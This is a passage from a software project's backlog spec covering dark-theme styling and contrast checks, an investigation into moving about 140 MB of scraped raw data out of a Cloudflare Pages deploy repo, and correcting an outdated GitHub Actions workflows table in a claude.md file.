  `classNames.js` rather than repeating long class strings).
- Chart.js: theme-dependent tick/grid/legend colours — centralise a
  `useChartTheme()` hook returning the option fragments; charts must re-render
  on toggle.
- StatusBadge/WaiverBadge colour pairs need dark variants that keep WCAG AA
  contrast; the brand greens (#335145, #10b981) need checked dark-surface
  pairings.
- PDF viewer function page and NotFound/Privacy etc. included; OG images and
  emails out of scope.

**Acceptance criteria.** Toggle flips instantly with no flash on reload;
axe/contrast checks pass on Dashboard, Mergers, MergerDetail, Analysis in
both themes; preference respected on first visit.

---

## Part VI — Other

### 30. Move bulky raw data out of the deploy-triggering repo path

**Priority:** P3 · **Effort:** medium (mostly ops)

**Problem.** `data/raw/` is ~140 MB of scraped HTML/PDF growing forever inside
the same repo whose pushes trigger Cloudflare Pages deploys; clones and Action
checkouts get slower every month. The `cli-dist` orphan branch already proves
the pattern for build artefacts.

**Spec.** Investigation-first item — produce a short ADR
(`docs/adr-raw-data-storage.md`) choosing between: (a) an orphan `raw-data`
branch checked out by pipeline jobs at a pinned path, (b) Cloudflare R2 with
the pipeline syncing via rclone/wrangler and PDFs served to the site from R2
(note the Pages Function `env.ASSETS.fetch` for PDFs would need rework —
document this dependency explicitly: `/mergers/{id}/{file}.pdf` currently
resolves from `public/` assets which are **copied from data/raw at build
time** — verify exactly how PDFs get into the deployed site before choosing),
or (c) status quo with `git gc`/partial-clone guidance. Include measured clone
times and per-option workflow changes. Implementation is a follow-up.

**Acceptance criteria.** ADR merged with a recommendation, migration steps,
and rollback; no behaviour change in this item.

### 31. Fix the workflows table drift in claude.md

**Priority:** P3 · **Effort:** trivial

**Problem.** The "GitHub Actions Workflows" table in `claude.md` (lines
~155-167) lists `all-mergers.yml`, which does not exist, and omits
`pipeline.yml`, `embed.yml`, `publish-cli-sqlite.yml`,
`detect-related-mergers.yml`, `detect-related-parties.yml`,
`frontend-test.yml`, and `fix-missing-notification-dates.yml`.

**Spec.** Rebuild the table from the actual files in `.github/workflows/`
(name, trigger/schedule from the `on:` block, one-line purpose from each
file's comments). While there, spot-check the rest of claude.md's factual
claims touched by recent work (output-file table, project structure) and fix
any other drift found — but keep the change documentation-only.

**Acceptance criteria.** Every file in `.github/workflows/` appears in the
table exactly once; no listed workflow lacks a file.
